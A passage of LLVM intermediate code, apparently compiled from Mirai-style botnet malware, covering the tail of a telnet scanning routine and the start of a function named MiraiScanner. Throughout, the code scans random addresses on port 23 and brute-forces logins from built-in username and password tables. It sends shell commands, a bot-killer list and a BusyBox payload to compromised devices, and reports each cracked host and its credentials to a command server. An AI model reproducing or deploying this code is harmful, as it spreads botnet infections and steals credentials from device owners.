  %105 = load i32, i32* %104, align 16
  %106 = srem i32 %105, 64
  %107 = zext i32 %106 to i64
  %108 = shl i64 1, %107
  %109 = sdiv i32 %105, 64
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 %110
  %112 = load i64, i64* %111, align 8
  %113 = or i64 %108, %112
  store i64 %113, i64* %111, align 8
  store i64 0, i64* %32, align 8
  store i64 %46, i64* %33, align 8
  %114 = load i32, i32* %104, align 16
  %115 = add nsw i32 %114, 1
  %116 = call i32 @select(i32 %115, %struct.fd_set* null, %struct.fd_set* nonnull %3, %struct.fd_set* null, %struct.timeval* nonnull %4) #7
  switch i32 %116, label %129 [
    i32 1, label %117
    i32 -1, label %128
  ]

; <label>:117:                                    ; preds = %102
  store i32 0, i32* %51, align 16
  store i32 4, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %118 = load i32, i32* %104, align 16
  %119 = call i32 @getsockopt(i32 %118, i32 1, i32 4, i8* nonnull %47, i32* nonnull %5) #7
  %120 = load i32, i32* %6, align 4
  %121 = icmp eq i32 %120, 0
  br i1 %121, label %123, label %122

; <label>:122:                                    ; preds = %117
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:123:                                    ; preds = %117
  %124 = load i32, i32* %104, align 16
  %125 = call i32 (i32, i32, ...) @fcntl(i32 %124, i32 3, i8* null) #7
  %126 = and i32 %125, -2049
  %127 = call i32 (i32, i32, ...) @fcntl(i32 %124, i32 4, i32 %126) #7
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 2)
  br label %379

; <label>:128:                                    ; preds = %102
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:129:                                    ; preds = %102
  %130 = load i32, i32* %51, align 16
  %131 = add i32 %130, 7
  %132 = zext i32 %131 to i64
  %133 = call i64 @time(i64* null) #7
  %134 = icmp slt i64 %132, %133
  br i1 %134, label %135, label %379

; <label>:135:                                    ; preds = %129
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:136:                                    ; preds = %57
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %138 = load i32, i32* %137, align 16
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 9
  %140 = load i8*, i8** %139, align 8
  %141 = call i32 @read_until_response(i32 %138, i32 %0, i8* %140, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i64 0, i64 0))
  %142 = icmp eq i32 %141, 0
  br i1 %142, label %151, label %143

; <label>:143:                                    ; preds = %136
  %144 = call i64 @time(i64* null) #7
  %145 = trunc i64 %144 to i32
  store i32 %145, i32* %51, align 16
  %146 = load i8*, i8** %139, align 8
  %147 = call i32 @contains_fail(i8* %146)
  %148 = icmp eq i32 %147, 0
  br i1 %148, label %150, label %149

; <label>:149:                                    ; preds = %143
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 0)
  br label %379

; <label>:150:                                    ; preds = %143
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 3)
  br label %379

; <label>:151:                                    ; preds = %136
  %152 = load i32, i32* %51, align 16
  %153 = add i32 %152, 7
  %154 = zext i32 %153 to i64
  %155 = call i64 @time(i64* null) #7
  %156 = icmp slt i64 %154, %155
  br i1 %156, label %157, label %379

; <label>:157:                                    ; preds = %151
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:158:                                    ; preds = %57
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %160 = load i32, i32* %159, align 16
  %161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 4
  %162 = load i8, i8* %161, align 2
  %163 = zext i8 %162 to i64
  %164 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %163
  %165 = load i8*, i8** %164, align 8
  %166 = call i64 @strlen(i8* %165) #14
  %167 = call i64 @send(i32 %160, i8* %165, i64 %166, i32 16384) #7
  %168 = icmp slt i64 %167, 0
  br i1 %168, label %169, label %170

; <label>:169:                                    ; preds = %158
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:170:                                    ; preds = %158
  %171 = load i32, i32* %159, align 16
  %172 = call i64 @send(i32 %171, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.501, i64 0, i64 0), i64 2, i32 16384) #7
  %173 = icmp slt i64 %172, 0
  br i1 %173, label %174, label %175

; <label>:174:                                    ; preds = %170
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:175:                                    ; preds = %170
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 4)
  br label %379

; <label>:176:                                    ; preds = %57
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %178 = load i32, i32* %177, align 16
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 9
  %180 = load i8*, i8** %179, align 8
  %181 = call i32 @read_until_response(i32 %178, i32 %0, i8* %180, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i64 0, i64 0))
  %182 = icmp eq i32 %181, 0
  br i1 %182, label %191, label %183

; <label>:183:                                    ; preds = %176
  %184 = call i64 @time(i64* null) #7
  %185 = trunc i64 %184 to i32
  store i32 %185, i32* %51, align 16
  %186 = load i8*, i8** %179, align 8
  %187 = call i32 @contains_fail(i8* %186)
  %188 = icmp eq i32 %187, 0
  br i1 %188, label %190, label %189

; <label>:189:                                    ; preds = %183
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 0)
  br label %379

; <label>:190:                                    ; preds = %183
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 5)
  br label %379

; <label>:191:                                    ; preds = %176
  %192 = load i32, i32* %51, align 16
  %193 = add i32 %192, 7
  %194 = zext i32 %193 to i64
  %195 = call i64 @time(i64* null) #7
  %196 = icmp slt i64 %194, %195
  br i1 %196, label %197, label %379

; <label>:197:                                    ; preds = %191
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:198:                                    ; preds = %57
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %200 = load i32, i32* %199, align 16
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 5
  %202 = load i8, i8* %201, align 1
  %203 = zext i8 %202 to i64
  %204 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %203
  %205 = load i8*, i8** %204, align 8
  %206 = call i64 @strlen(i8* %205) #14
  %207 = call i64 @send(i32 %200, i8* %205, i64 %206, i32 16384) #7
  %208 = icmp slt i64 %207, 0
  br i1 %208, label %209, label %210

; <label>:209:                                    ; preds = %198
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:210:                                    ; preds = %198
  %211 = load i32, i32* %199, align 16
  %212 = call i64 @send(i32 %211, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.501, i64 0, i64 0), i64 2, i32 16384) #7
  %213 = icmp slt i64 %212, 0
  br i1 %213, label %214, label %215

; <label>:214:                                    ; preds = %210
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:215:                                    ; preds = %210
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 6)
  br label %379

; <label>:216:                                    ; preds = %57
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %218 = load i32, i32* %217, align 16
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 9
  %220 = load i8*, i8** %219, align 8
  %221 = call i32 @read_until_response(i32 %218, i32 %0, i8* %220, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i64 0, i64 0))
  %222 = icmp eq i32 %221, 0
  br i1 %222, label %254, label %223

; <label>:223:                                    ; preds = %216
  %224 = call i64 @time(i64* null) #7
  %225 = trunc i64 %224 to i32
  store i32 %225, i32* %51, align 16
  %226 = load i8*, i8** %219, align 8
  %227 = call i32 @contains_fail(i8* %226)
  %228 = icmp eq i32 %227, 0
  br i1 %228, label %230, label %229

; <label>:229:                                    ; preds = %223
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 0)
  br label %379

; <label>:230:                                    ; preds = %223
  %231 = load i8*, i8** %219, align 8
  %232 = call i32 @contains_success(i8* %231)
  %233 = icmp eq i32 %232, 0
  br i1 %233, label %253, label %234

; <label>:234:                                    ; preds = %230
  %235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 3
  %236 = load i8, i8* %235, align 1
  %237 = icmp eq i8 %236, 2
  br i1 %237, label %238, label %239

; <label>:238:                                    ; preds = %234
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 7)
  br label %379

; <label>:239:                                    ; preds = %234
  %240 = load i32, i32* @mainCommSock, align 4
  %241 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %50)
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 4
  %243 = load i8, i8* %242, align 2
  %244 = zext i8 %243 to i64
  %245 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %244
  %246 = load i8*, i8** %245, align 8
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 5
  %248 = load i8, i8* %247, align 1
  %249 = zext i8 %248 to i64
  %250 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %249
  %251 = load i8*, i8** %250, align 8
  %252 = call i32 (i32, i8*, ...) @sockprintf(i32 %240, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.502, i64 0, i64 0), i8* %241, i8* %246, i8* %251)
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 7)
  br label %379

; <label>:253:                                    ; preds = %230
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:254:                                    ; preds = %216
  %255 = load i32, i32* %51, align 16
  %256 = add i32 %255, 7
  %257 = zext i32 %256 to i64
  %258 = call i64 @time(i64* null) #7
  %259 = icmp slt i64 %257, %258
  br i1 %259, label %260, label %379

; <label>:260:                                    ; preds = %254
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:261:                                    ; preds = %57
  %262 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %34, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.503, i64 0, i64 0), i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @Temp_Directorys, i64 0, i64 0)) #7
  %263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %264 = load i32, i32* %263, align 16
  %265 = call i64 @strlen(i8* nonnull %34) #14
  %266 = call i64 @send(i32 %264, i8* nonnull %34, i64 %265, i32 16384) #7
  %267 = icmp slt i64 %266, 0
  br i1 %267, label %268, label %269

; <label>:268:                                    ; preds = %261
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:269:                                    ; preds = %261
  call void @RemoveTempDirs()
  %270 = load i32, i32* @mainCommSock, align 4
  %271 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %50)
  %272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 4
  %273 = load i8, i8* %272, align 2
  %274 = zext i8 %273 to i64
  %275 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %274
  %276 = load i8*, i8** %275, align 8
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 5
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i64
  %280 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %279
  %281 = load i8*, i8** %280, align 8
  %282 = call i32 (i32, i8*, ...) @sockprintf(i32 %270, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.504, i64 0, i64 0), i8* %271, i8* %276, i8* %281)
  %283 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %48, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.505, i64 0, i64 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i64 0, i64 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i64 0, i64 0)) #7
  %284 = load i32, i32* %263, align 16
  %285 = call i64 @strlen(i8* nonnull %48) #14
  %286 = call i64 @send(i32 %284, i8* nonnull %48, i64 %285, i32 16384) #7
  %287 = icmp slt i64 %286, 0
  br i1 %287, label %288, label %289

; <label>:288:                                    ; preds = %269
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:289:                                    ; preds = %269
  %290 = load i32, i32* @mainCommSock, align 4
  %291 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %50)
  %292 = load i8, i8* %272, align 2
  %293 = zext i8 %292 to i64
  %294 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %293
  %295 = load i8*, i8** %294, align 8
  %296 = load i8, i8* %277, align 1
  %297 = zext i8 %296 to i64
  %298 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %297
  %299 = load i8*, i8** %298, align 8
  %300 = call i32 (i32, i8*, ...) @sockprintf(i32 %290, i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.506, i64 0, i64 0), i8* %291, i8* %295, i8* %299)
  call void @advance_telstate(%struct.telstate_t* nonnull %50, i32 8)
  br label %379

; <label>:301:                                    ; preds = %57
  %302 = call i64 @time(i64* null) #7
  %303 = trunc i64 %302 to i32
  store i32 %303, i32* %51, align 16
  %304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  %305 = load i32, i32* %304, align 16
  %306 = call i64 @send(i32 %305, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.507, i64 0, i64 0), i64 4, i32 16384) #7
  %307 = load i32, i32* %304, align 16
  %308 = call i64 @send(i32 %307, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.508, i64 0, i64 0), i64 7, i32 16384) #7
  %309 = load i32, i32* %304, align 16
  %310 = load i8*, i8** @Busybox_Payload, align 8
  %311 = call i64 @strlen(i8* %310) #14
  %312 = call i64 @send(i32 %309, i8* %310, i64 %311, i32 16384) #7
  %313 = icmp slt i64 %312, 0
  br i1 %313, label %314, label %315

; <label>:314:                                    ; preds = %301
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:315:                                    ; preds = %301
  %316 = load i32, i32* @mainCommSock, align 4
  %317 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %50)
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 4
  %319 = load i8, i8* %318, align 2
  %320 = zext i8 %319 to i64
  %321 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %320
  %322 = load i8*, i8** %321, align 8
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 5
  %324 = load i8, i8* %323, align 1
  %325 = zext i8 %324 to i64
  %326 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %325
  %327 = load i8*, i8** %326, align 8
  %328 = call i32 (i32, i8*, ...) @sockprintf(i32 %316, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.509, i64 0, i64 0), i8* %317, i8* %322, i8* %327)
  %329 = load i32, i32* %304, align 16
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 9
  %331 = load i8*, i8** %330, align 8
  %332 = call i32 @read_until_response(i32 %329, i32 %0, i8* %331, i32 1024, i8** bitcast ([7 x i8]* @.str.510 to i8**))
  %333 = icmp eq i32 %332, 0
  br i1 %333, label %356, label %334

; <label>:334:                                    ; preds = %315
  %335 = load i8*, i8** %330, align 8
  %336 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %335, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.510, i64 0, i64 0)) #7
  %337 = icmp eq i32 %336, 0
  br i1 %337, label %356, label %338

; <label>:338:                                    ; preds = %334
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 3
  %340 = load i8, i8* %339, align 1
  %341 = icmp eq i8 %340, 3
  br i1 %341, label %356, label %342

; <label>:342:                                    ; preds = %338
  %343 = load i32, i32* @mainCommSock, align 4
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 1
  %345 = load i32, i32* %344, align 4
  %346 = call i8* @inet_ntoa(i32 %345) #7
  %347 = load i8, i8* %318, align 2
  %348 = zext i8 %347 to i64
  %349 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %348
  %350 = load i8*, i8** %349, align 8
  %351 = load i8, i8* %323, align 1
  %352 = zext i8 %351 to i64
  %353 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %352
  %354 = load i8*, i8** %353, align 8
  %355 = call i32 (i32, i8*, ...) @sockprintf(i32 %343, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.511, i64 0, i64 0), i8* %346, i8* %350, i8* %354)
  store i8 3, i8* %339, align 1
  br label %356

; <label>:356:                                    ; preds = %338, %334, %315, %342
  %357 = load i32, i32* %51, align 16
  %358 = add i32 %357, 10
  %359 = zext i32 %358 to i64
  %360 = call i64 @time(i64* null) #7
  %361 = icmp slt i64 %359, %360
  br i1 %361, label %362, label %379

; <label>:362:                                    ; preds = %356
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 3
  %364 = load i8, i8* %363, align 1
  %365 = icmp eq i8 %364, 3
  br i1 %365, label %378, label %366

; <label>:366:                                    ; preds = %362
  %367 = load i32, i32* @mainCommSock, align 4
  %368 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %50)
  %369 = load i8, i8* %318, align 2
  %370 = zext i8 %369 to i64
  %371 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Usernames, i64 0, i64 %370
  %372 = load i8*, i8** %371, align 8
  %373 = load i8, i8* %323, align 1
  %374 = zext i8 %373 to i64
  %375 = getelementptr inbounds [35 x i8*], [35 x i8*]* @Telnet_Passwords, i64 0, i64 %374
  %376 = load i8*, i8** %375, align 8
  %377 = call i32 (i32, i8*, ...) @sockprintf(i32 %367, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.512, i64 0, i64 0), i8* %368, i8* %372, i8* %376)
  br label %378

; <label>:378:                                    ; preds = %362, %366
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
  br label %379

; <label>:379:                                    ; preds = %57, %175, %215, %289, %101, %100, %135, %129, %157, %151, %197, %191, %260, %254, %378, %356, %229, %238, %239, %253, %189, %190, %149, %150, %122, %123, %83, %314, %288, %268, %214, %209, %174, %169, %128, %82, %78
  %380 = add nsw i32 %.1125, 1
  %381 = icmp slt i32 %380, %.
  %brmerge = or i1 %381, %30
  %.mux = select i1 %381, i32 %380, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %379
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #5

; Function Attrs: noinline noreturn nounwind uwtable
define void @MiraiScanner(i32, i32) local_unnamed_addr #11 {
  %3 = alloca %struct.fd_set, align 8
  %4 = alloca %struct.timeval, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca [80 x i8], align 16
  %9 = alloca [80 x i8], align 16
  %10 = tail call i32 @getdtablesize() #7
  %11 = add nsw i32 %10, -100
  %12 = icmp sgt i32 %11, %1
  %. = select i1 %12, i32 %1, i32 %11
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 23) #15
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %17 = bitcast i8* %16 to i64*
  store i64 0, i64* %17, align 4
  %18 = tail call noalias i8* @malloc(i64 1025) #7
  tail call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 1025, i32 1, i1 false)
  %19 = zext i32 %. to i64
  %20 = alloca %struct.telstate_t, i64 %19, align 16
  %21 = bitcast %struct.telstate_t* %20 to i8*
  %22 = sext i32 %. to i64
  %23 = mul nsw i64 %22, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %21, i8 0, i64 %23, i32 16, i1 false)
  %24 = icmp sgt i32 %., 0
  br i1 %24, label %.lr.ph127.preheader, label %.preheader

.lr.ph127.preheader:                              ; preds = %2
  %25 = sext i32 %. to i64
  %xtraiter = and i64 %25, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph127.prol.loopexit, label %.lr.ph127.prol.preheader

.lr.ph127.prol.preheader:                         ; preds = %.lr.ph127.preheader
  br label %.lr.ph127.prol

.lr.ph127.prol:                                   ; preds = %.lr.ph127.prol.preheader
  %26 = bitcast %struct.telstate_t* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %26, i8 0, i64 32, i32 16, i1 false)
  %27 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 0, i32 3
  store i8 1, i8* %27, align 1
  %28 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 0, i32 9
  store i8* %18, i8** %28, align 8
  br label %.lr.ph127.prol.loopexit

.lr.ph127.prol.loopexit:                          ; preds = %.lr.ph127.preheader, %.lr.ph127.prol
  %indvars.iv.unr = phi i64 [ 0, %.lr.ph127.preheader ], [ 1, %.lr.ph127.prol ]
  %29 = icmp eq i32 %., 1
  br i1 %29, label %.preheader.loopexit, label %.lr.ph127.preheader.new

.lr.ph127.preheader.new:                          ; preds = %.lr.ph127.prol.loopexit
  br label %.lr.ph127

.preheader.loopexit.unr-lcssa:                    ; preds = %.lr.ph127
  br label %.preheader.loopexit

.preheader.loopexit:                              ; preds = %.lr.ph127.prol.loopexit, %.preheader.loopexit.unr-lcssa
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %2
  %30 = icmp sgt i32 %., 0
  %31 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 0
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i64 0, i32 1
  %34 = getelementptr inbounds [80 x i8], [80 x i8]* %8, i64 0, i64 0
  br label %.loopexit

.lr.ph127:                                        ; preds = %.lr.ph127, %.lr.ph127.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr, %.lr.ph127.preheader.new ], [ %indvars.iv.next.1, %.lr.ph127 ]
  %35 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv
  %36 = bitcast %struct.telstate_t* %35 to i8*
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 32, i32 16, i1 false)
  %37 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv, i32 3
  store i8 1, i8* %37, align 1
  %38 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv, i32 9
  store i8* %18, i8** %38, align 8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %39 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv.next
  %40 = bitcast %struct.telstate_t* %39 to i8*
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 32, i32 16, i1 false)
  %41 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv.next, i32 3
  store i8 1, i8* %41, align 1
  %42 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %indvars.iv.next, i32 9
  store i8* %18, i8** %42, align 8
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %43 = icmp slt i64 %indvars.iv.next.1, %25
  br i1 %43, label %.lr.ph127, label %.preheader.loopexit.unr-lcssa

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %30, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %45 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 0
  %46 = sext i32 %0 to i64
  %47 = bitcast i32* %6 to i8*
  %48 = getelementptr inbounds [80 x i8], [80 x i8]* %9, i64 0, i64 0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %379
  %.1125 = phi i32 [ %.mux, %379 ], [ 0, %.lr.ph.preheader ]
  %49 = sext i32 %.1125 to i64
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 7
  %52 = load i32, i32* %51, align 16
  %53 = icmp eq i32 %52, 0
  br i1 %53, label %54, label %57

; <label>:54:                                     ; preds = %.lr.ph
  %55 = call i64 @time(i64* null) #7
  %56 = trunc i64 %55 to i32
  store i32 %56, i32* %51, align 16
  br label %57

; <label>:57:                                     ; preds = %54, %.lr.ph
  %58 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 2
  %59 = load i8, i8* %58, align 8
  switch i8 %59, label %379 [
    i8 0, label %60
    i8 1, label %102
    i8 2, label %138
    i8 3, label %160
    i8 4, label %178
    i8 5, label %200
    i8 6, label %218
    i8 7, label %263
    i8 8, label %303
  ]

; <label>:60:                                     ; preds = %57
  %61 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 3
  %62 = load i8, i8* %61, align 1
  switch i8 %62, label %83 [
    i8 1, label %63
    i8 0, label %70
  ]

; <label>:63:                                     ; preds = %60
  %64 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 9
  %65 = bitcast i8** %64 to i64*
  %66 = load i64, i64* %65, align 8
  %67 = bitcast %struct.telstate_t* %50 to i8*
  call void @llvm.memset.p0i8.i64(i8* %67, i8 0, i64 32, i32 16, i1 false)
  store i64 %66, i64* %65, align 8
  %68 = call i32 @MiraiIPRanges()
  %69 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 1
  store i32 %68, i32* %69, align 4
  br label %83

; <label>:70:                                     ; preds = %60
  %71 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 4
  %72 = load i8, i8* %71, align 2
  %73 = add i8 %72, 1
  store i8 %73, i8* %71, align 2
  %74 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 5
  %75 = load i8, i8* %74, align 1
  %76 = add i8 %75, 1
  store i8 %76, i8* %74, align 1
  %77 = icmp eq i8 %76, 35
  br i1 %77, label %78, label %79

; <label>:78:                                     ; preds = %70
  store i8 1, i8* %61, align 1
  br label %79

; <label>:79:                                     ; preds = %78, %70
  %80 = load i8, i8* %71, align 2
  %81 = icmp eq i8 %80, 34
  br i1 %81, label %82, label %83

; <label>:82:                                     ; preds = %79
  store i8 1, i8* %61, align 1
  br label %379

; <label>:83:                                     ; preds = %60, %79, %63
  store i16 2, i16* %13, align 4
  store i16 %14, i16* %15, align 2
  store i64 0, i64* %17, align 4
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i64 %49, i32 1
  %85 = load i32, i32* %84, align 4
  store i32 %85, i32* %44, align 4
  %86 = call i32 @socket(i32 2, i32 1, i32 0) #7
  %87 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i64 0, i32 0
  store i32 %86, i32* %87, align 16
  %88 = icmp eq i32 %86, -1
  br i1 %88, label %379, label %89

; <label>:89:                                     ; preds = %83
  %90 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 3, i8* null) #7
  %91 = or i32 %90, 2048
  %92 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 4, i32 %91) #7
  %93 = load i32, i32* %87, align 16
  %94 = call i32 @connect(i32 %93, %struct.sockaddr* nonnull %31, i32 16) #7
  %95 = icmp eq i32 %94, -1
  br i1 %95, label %96, label %101

; <label>:96:                                     ; preds = %89
  %97 = tail call i32* @__errno_location() #15
  %98 = load i32, i32* %97, align 4
  %99 = icmp eq i32 %98, 115
  br i1 %99, label %101, label %100

; <label>:100:                                    ; preds = %96
  call void @reset_telstate(%struct.telstate_t* nonnull %50)
